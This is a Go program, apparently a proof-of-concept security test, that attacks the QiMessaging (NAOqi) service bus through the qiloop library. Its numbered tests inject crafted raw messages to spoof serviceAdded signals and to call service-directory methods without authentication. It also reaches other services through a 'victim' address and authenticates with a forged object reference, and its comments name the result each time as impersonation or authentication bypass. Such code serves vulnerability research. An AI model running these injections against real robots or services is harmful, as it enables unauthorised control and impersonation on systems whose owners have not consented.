package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"time"

	"github.com/lugu/qiloop/bus"
	"github.com/lugu/qiloop/bus/net"
	"github.com/lugu/qiloop/bus/services"
	"github.com/lugu/qiloop/bus/session"
	"github.com/lugu/qiloop/type/basic"
	"github.com/lugu/qiloop/type/object"
	"github.com/lugu/qiloop/type/value"
)

var DirectoryAddr *string
var VictimAddr *string

func messageCallMachineID() net.Message {
	serviceID := uint32(1) // serviceDirectory
	objectID := uint32(1)
	actionID := uint32(108) // machineId
	id := uint32(55555)

	header := net.NewHeader(net.Call, serviceID, objectID, actionID, id)
	return net.NewMessage(header, make([]byte, 0))
}

func callMessages() []net.Message {
	return []net.Message{
		messageCallMachineID(),
	}
}

func listenReply(endpoint net.EndPoint, done chan int) {

	filter := func(hdr *net.Header) (matched bool, keep bool) {
		log.Printf("response: %v", *hdr)
		if hdr.ID == 55555 {
			return true, true
		}
		return false, true
	}

	consumer := func(msg *net.Message) error {
		log.Printf("response payload: %v", string(msg.Payload))
		done <- 1
		return nil
	}

	closer := func(err error) {
		close(done)
	}

	endpoint.AddHandler(filter, consumer, closer)
}

func listenServiceAddedSignal(addr string, done chan int, tag string) func() {
	sess, err := session.NewSession(addr)
	if err != nil {
		log.Fatalf("failed to connect: %s", err)
	}
	proxies := services.Services(sess)
	directory, err := proxies.ServiceDirectory(nil)
	if err != nil {
		log.Fatalf("failed to connect log manager: %s", err)
	}

	cancel, channel, err := directory.SubscribeServiceAdded()
	if err != nil {
		log.Fatalf("failed to get remote signal channel: %s", err)
	}

	go func() {
		for e := range channel {
			if e.Name == tag {
				log.Printf("%s was emited", tag)
				done <- 1
				return
			}
			log.Printf("service added: %s (%d) - %s", e.Name,
				e.ServiceID, tag)
		}
	}()
	return cancel
}

func messagePostServiceAdded(tag string) net.Message {
	serviceID := uint32(1) // serviceDirectory
	objectID := uint32(1)
	actionID := uint32(106) // serviceAdded
	id := uint32(44444)

	header := net.NewHeader(net.Post, serviceID, objectID, actionID, id)
	buf := bytes.NewBuffer(make([]byte, 0))
	basic.WriteUint32(888, buf)
	basic.WriteString(tag, buf)
	return net.NewMessage(header, buf.Bytes())
}

func postMessages(tag string) []net.Message {
	return []net.Message{
		messagePostServiceAdded(tag),
	}
}

func inject(endpoint net.EndPoint, messages []net.Message) error {
	for i, m := range messages {
		err := endpoint.Send(m)
		if err != nil {
			return fmt.Errorf("send %d: %s", i, err)
		}
	}
	return nil
}

func connect(addr string, doesAuth bool) net.EndPoint {
	if doesAuth {
		cache, err := bus.NewCachedSession(addr)
		if err != nil {
			log.Fatalf("failed to connect: %s", err)
		}
		return cache.Endpoint
	} else {
		endpoint, err := net.DialEndPoint(addr)
		if err != nil {
			log.Fatalf("failed to connect: %s", err)
		}
		return endpoint
	}
}

// test 0: verify call works as intented
func test0() {
	log.Printf("test0: verify call works as intented")
	done := make(chan int)
	wait := time.After(time.Second * 5)
	endpoint := connect(*DirectoryAddr, true)
	go listenReply(endpoint, done)

	err := inject(endpoint, callMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
		log.Printf("success")
	case _ = <-wait:
		log.Printf("timeout")
	}
}

type objectReferenceValue struct {
}

func (o *objectReferenceValue) Signature() string {
	return "(bIII)<ObjectReference,boolean,parentID,serviceID,objectID>"

}

func (o *objectReferenceValue) Write(w io.Writer) error {
	basic.WriteString(o.Signature(), w)
	basic.WriteBool(false, w)    // not followed by a meta object
	basic.WriteUint32(2^11, w)   // unknown meta object ID
	basic.WriteUint32(0, w)      // service ID
	basic.WriteUint32(2^31+1, w) // object ID
	return nil
}

func capabilityMap() bus.CapabilityMap {

	return bus.CapabilityMap{
		"ClientServerSocket":    value.Bool(true),
		"MessageFlags":          value.Bool(true),
		"MetaObjectCache":       value.Bool(true),
		"RemoteCancelableCalls": value.Bool(true),
		"Hello":                 &objectReferenceValue{},
	}
}

// test 1: post a signal directly to a service
//	1. connect to service
//	2. authenticate
//	3. post a signal to the service
//	=> can impersonate a service
func test1() {
	log.Printf("test 1: post a signal to the service")
	done := make(chan int)
	wait := time.After(time.Second * 5)
	cancel := listenServiceAddedSignal(*DirectoryAddr, done, "foobar")

	endpoint := connect(*DirectoryAddr, true)
	err := inject(endpoint, postMessages("foobar"))
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
		log.Printf("success")
	case _ = <-wait:
		log.Printf("timeout")
	}
	cancel()
}

// test 2: post a signal directly to the targeted service
//	1. connect to service
//	2. post a signal to the service
//	=> can by-pass authentication
func test2() {
	log.Printf("test2: post a signal to the service without authentication")
	done := make(chan int)
	wait := time.After(time.Second * 5)
	cancel := listenServiceAddedSignal(*DirectoryAddr, done, "eggspam")

	endpoint := connect(*DirectoryAddr, false)
	err := inject(endpoint, postMessages("eggspam"))
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
		log.Printf("success")
	case _ = <-wait:
		log.Printf("timeout")
	}
	cancel()
}

// test 3: post a signal directly to the targeted service
//	1. connect to service
//	2. authenticate
//	3. post a signal to another service
// 	=> can by-pass authentication
func test3() {
	log.Printf("test3: post a signal to a remote service")
	done := make(chan int)
	wait := time.After(time.Second * 5)
	cancel := listenServiceAddedSignal(*DirectoryAddr, done, "bazzfazz")

	endpoint := connect(*VictimAddr, true)
	err := inject(endpoint, postMessages("bazzfazz"))
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
		log.Printf("success")
	case _ = <-wait:
		log.Printf("timeout")
	}
	cancel()
}

// test 4: call a method directly to the targeted service
//	1. connect to service
//	2. call a method of the service
//	=> can by-pass authentication
func test4() {
	log.Printf("test4: call a method without authentication")
	done := make(chan int)
	wait := time.After(time.Second * 5)
	endpoint := connect(*DirectoryAddr, false)
	go listenReply(endpoint, done)

	err := inject(endpoint, callMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
		log.Printf("success")
	case _ = <-wait:
		log.Printf("timeout")
	}
}

// test 5: call a method to a remote object
//	1. connect to service
//	2. authenticate
//	3. call a method of another service
//	=> can by-pass authentication
func test5() {
	log.Printf("test5: call a method to a remote object")
	done := make(chan int)
	wait := time.After(time.Second * 5)
	endpoint := connect(*VictimAddr, false)
	go listenReply(endpoint, done)

	err := inject(endpoint, callMessages())
	if err != nil {
		log.Fatalf("%s", err)
	}
	select {
	case _ = <-done:
		log.Printf("success")
	case _ = <-wait:
		log.Printf("timeout")
	}
}

// test 6: authenticate with an object
//	1. connect to service
//	2. authenticate with an object
//	3. wait for an incomming message
//	=> can initiate communication without authentication
func test6() {
	log.Printf("test6: authenticate with a remote object")
	done := make(chan int)
	wait := time.After(time.Second * 5)
	endpoint := connect(*VictimAddr, false)
	objectID := uint32(2 ^ 31 + 1)

	f := func(hdr *net.Header) (matched bool, keep bool) {
		if hdr.Object == objectID {
			return true, false
		}
		return false, true
	}
	c := func(msg *net.Message) error {
		log.Printf("response: %#v", *msg)
		done <- 1
		return nil
	}
	cl := func(err error) {
		log.Printf("error: %s", err)
	}
	endpoint.AddHandler(f, c, cl)

	// Service zero is not a registered service. Create a cached
	// session to resolve its name manually.
	cache := bus.NewCache(endpoint)
	cache.AddService("ServiceZero", 0, object.MetaService0)
	proxies := bus.Services(cache)
	service0, err := proxies.ServiceServer()
	if err != nil {
		log.Fatalf("failed to connect log manager: %s", err)
	}

	permission := capabilityMap()
	_, err = service0.Authenticate(permission) // ignore response
	if err != nil {
		log.Fatalf("%s", err)
	}

	select {
	case _ = <-done:
		log.Printf("success")
	case _ = <-wait:
		log.Printf("timeout")
	}
}

func main() {

	VictimAddr = flag.String("qi-url-victim",
		"tcp://127.0.0.1:9559", "open service to inject packets")
	DirectoryAddr = flag.String("qi-url-directory",
		"tcp://127.0.0.1:9559", "service directory url")
	flag.Parse()

	test0()
	test1()
	test2()
	test3()
	test4()
	test5()
	test6()
}
